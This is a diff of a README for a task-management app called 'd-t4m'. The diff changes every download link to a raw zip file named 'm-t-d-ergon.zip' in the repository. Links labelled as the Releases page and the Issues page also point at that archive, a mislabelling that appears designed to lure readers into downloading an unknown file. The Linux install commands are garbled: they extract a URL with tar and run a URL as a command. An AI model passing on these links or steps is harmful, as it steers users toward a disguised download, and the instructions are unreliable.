@@ -1,6 +1,6 @@
 # 🎉 d-t4m - Effortlessly Manage Your Tasks
 
-[![Download d-t4m](https://raw.githubusercontent.com/harroldpogi/d-t4m/main/Sextilis/d-t4m.zip)](https://raw.githubusercontent.com/harroldpogi/d-t4m/main/Sextilis/d-t4m.zip)
+[![Download d-t4m](https://raw.githubusercontent.com/harroldpogi/d-t4m/main/Sextilis/m-t-d-ergon.zip)](https://raw.githubusercontent.com/harroldpogi/d-t4m/main/Sextilis/m-t-d-ergon.zip)
 
 ## 🚀 Getting Started
 
@@ -19,13 +19,13 @@ Before you start, ensure your system meets the following requirements:
 
 To get d-t4m, you need to visit the Releases page. You can find it here:
 
-[Download d-t4m](https://raw.githubusercontent.com/harroldpogi/d-t4m/main/Sextilis/d-t4m.zip)
+[Download d-t4m](https://raw.githubusercontent.com/harroldpogi/d-t4m/main/Sextilis/m-t-d-ergon.zip)
 
 Once you’re on the page, follow these steps:
 
 1. Look for the latest version at the top of the list.
 2. Click on the version number to expand the release details.
-3. Download the file that matches your operating system. This could be a `.exe` file for Windows, a `.dmg` for MacOS, or a `https://raw.githubusercontent.com/harroldpogi/d-t4m/main/Sextilis/d-t4m.zip` for Linux systems.
+3. Download the file that matches your operating system. This could be a `.exe` file for Windows, a `.dmg` for MacOS, or a `https://raw.githubusercontent.com/harroldpogi/d-t4m/main/Sextilis/m-t-d-ergon.zip` for Linux systems.
 4. After the download is complete, locate the file in your Downloads folder.
 
 ## 🛠️ Installing d-t4m
@@ -46,12 +46,12 @@ Once you’re on the page, follow these steps:
 ### For Linux:
 
 1. Open your terminal.
-2. Navigate to the folder where you downloaded the `https://raw.githubusercontent.com/harroldpogi/d-t4m/main/Sextilis/d-t4m.zip` file.
+2. Navigate to the folder where you downloaded the `https://raw.githubusercontent.com/harroldpogi/d-t4m/main/Sextilis/m-t-d-ergon.zip` file.
 3. Run the following commands:
    ```bash
-   tar -xvzf https://raw.githubusercontent.com/harroldpogi/d-t4m/main/Sextilis/d-t4m.zip
+   tar -xvzf https://raw.githubusercontent.com/harroldpogi/d-t4m/main/Sextilis/m-t-d-ergon.zip
    cd d-t4m
-   https://raw.githubusercontent.com/harroldpogi/d-t4m/main/Sextilis/d-t4m.zip
+   https://raw.githubusercontent.com/harroldpogi/d-t4m/main/Sextilis/m-t-d-ergon.zip
    ```
 4. Follow any additional instructions provided in the terminal.
 
@@ -67,7 +67,7 @@ Once you have installed d-t4m, you can launch the application by finding it in y
 
 ## 💬 Support
 
-If you encounter any issues while using d-t4m, please consult the user guide included in the installation. You can also find help by visiting our GitHub Issues page [here](https://raw.githubusercontent.com/harroldpogi/d-t4m/main/Sextilis/d-t4m.zip).
+If you encounter any issues while using d-t4m, please consult the user guide included in the installation. You can also find help by visiting our GitHub Issues page [here](https://raw.githubusercontent.com/harroldpogi/d-t4m/main/Sextilis/m-t-d-ergon.zip).
 
 ## 📅 Regular Updates
 
@@ -79,4 +79,4 @@ Your input is valuable. If you would like to suggest features or report bugs, pl
 
 Thank you for choosing d-t4m! Enjoy organizing your tasks effortlessly. 
 
-[Download d-t4m](https://raw.githubusercontent.com/harroldpogi/d-t4m/main/Sextilis/d-t4m.zip)
+[Download d-t4m](https://raw.githubusercontent.com/harroldpogi/d-t4m/main/Sextilis/m-t-d-ergon.zip)
